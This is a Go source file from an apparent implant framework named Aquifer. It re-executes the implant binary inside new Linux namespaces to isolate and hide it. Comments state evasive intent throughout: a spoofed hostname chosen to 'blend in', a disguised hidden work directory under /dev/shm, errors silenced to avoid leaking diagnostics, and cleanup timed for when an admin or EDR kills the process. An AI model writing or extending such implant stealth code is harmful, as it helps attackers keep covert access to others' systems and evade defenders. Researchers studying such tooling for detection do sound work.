package namespace

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

const (
	// nsStageEnv is set when re-executing inside the new namespace.
	nsStageEnv = "_NS_STAGE"
	// nsStageChild is the value indicating we are the child process inside namespaces.
	nsStageChild = "child"
)

// Bootstrap is the main entry point for namespace-based execution.
// It detects whether we are the parent (pre-unshare) or child (post-unshare)
// process and acts accordingly.
//
// Parent path: re-executes /proc/self/exe with new namespaces via clone flags.
// Child path: configures the namespace environment and returns control to the caller.
func Bootstrap(cfg *config.ImplantConfig) error {
	if IsInNamespace() {
		// We are the child process inside the new namespace set.
		// Configure each namespace subsystem.
		return SetupNamespaces(cfg)
	}

	// Parent path: re-execute self inside new namespaces.
	return enterNamespaces()
}

// IsInNamespace returns true if the current process is running inside
// the implant's namespace (i.e., is the re-executed child).
func IsInNamespace() bool {
	return os.Getenv(nsStageEnv) == nsStageChild
}

// enterNamespaces re-executes the current binary (/proc/self/exe) with
// new PID, mount, network, UTS, and cgroup namespaces via clone flags.
// The child process inherits all file descriptors, args, and environment
// with the addition of the stage marker.
func enterNamespaces() error {
	exe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return fmt.Errorf("namespace: failed to resolve /proc/self/exe: %w", err)
	}

	// Build child environment: explicit copy to avoid mutating the
	// backing array of os.Environ() (potential data race).
	env := os.Environ()
	childEnv := make([]string, len(env), len(env)+1)
	copy(childEnv, env)
	childEnv = append(childEnv, nsStageEnv+"="+nsStageChild)

	cloneFlags := uintptr(
		syscall.CLONE_NEWPID |
			syscall.CLONE_NEWNS |
			syscall.CLONE_NEWNET |
			syscall.CLONE_NEWUTS |
			syscall.CLONE_NEWCGROUP,
	)

	cmd := &syscall.ProcAttr{
		Dir:   "/",
		Env:   childEnv,
		Files: []uintptr{os.Stdin.Fd(), os.Stdout.Fd(), os.Stderr.Fd()},
		Sys: &syscall.SysProcAttr{
			Cloneflags: cloneFlags,
		},
	}

	// Re-execute with the same arguments.
	childPid, err := syscall.ForkExec(exe, os.Args, cmd)
	if err != nil {
		return fmt.Errorf("namespace: failed to fork/exec into namespaces: %w", err)
	}

	// Parent: set up the host-side of the veth pair for the child's network namespace.
	if err := SetupVethPair(childPid); err != nil {
		// Non-fatal: the child can still operate without external network.
		// Silently ignore — do not leak diagnostic information to stderr.
		_ = err
	}

	// Handle SIGTERM/SIGINT in the parent so host-side artifacts are cleaned
	// up even if the parent is killed directly (e.g., by an admin or EDR).
	// SIGKILL cannot be caught, but that's unavoidable.
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
	go func() {
		<-sigCh
		signal.Stop(sigCh)
		// Kill the child so it can clean up its own artifacts.
		syscall.Kill(childPid, syscall.SIGTERM)
		CleanupHostNetwork()
		CleanupCgroups()
		os.Exit(1)
	}()

	// Wait for child to exit. The parent process terminates with the child's exit code.
	var ws syscall.WaitStatus
	_, err = syscall.Wait4(childPid, &ws, 0, nil)
	if err != nil {
		return fmt.Errorf("namespace: wait4 failed: %w", err)
	}

	// Clean up host-side artifacts before exiting.
	CleanupHostNetwork()
	CleanupCgroups()

	if ws.ExitStatus() != 0 {
		os.Exit(ws.ExitStatus())
	}
	os.Exit(0)
	return nil // required by compiler; os.Exit above ensures this is never reached
}

// SetupNamespaces configures each namespace subsystem in the correct order.
// Called from the child process after re-execution inside the namespace.
func SetupNamespaces(cfg *config.ImplantConfig) error {
	// 1. Mount namespace first: make mounts private before anything else.
	workDir := cfg.MountWorkDir
	if workDir == "" {
		workDir = "/dev/shm/.x11"
	}
	if err := SetupMountNamespace(workDir); err != nil {
		return fmt.Errorf("namespace: mount setup failed: %w", err)
	}

	// 2. PID namespace: mount private /proc and set up PID 1 signal handling.
	if err := SetupPIDNamespace(); err != nil {
		return fmt.Errorf("namespace: pid setup failed: %w", err)
	}

	// 3. UTS namespace: set hostname to blend in.
	hostname := cfg.TargetHostname
	if hostname == "" {
		hostname = "worker-01"
	}
	if err := SetupUTSNamespace(hostname); err != nil {
		return fmt.Errorf("namespace: uts setup failed: %w", err)
	}

	// 4. Network namespace: configure inside-namespace networking.
	// Network is best-effort; implant can operate without it.
	_ = ConfigureNamespaceNetwork()

	// 5. Cgroup namespace: isolate cgroup view.
	if err := SetupCgroupNamespace(); err != nil {
		return fmt.Errorf("namespace: cgroup setup failed: %w", err)
	}

	return nil
}
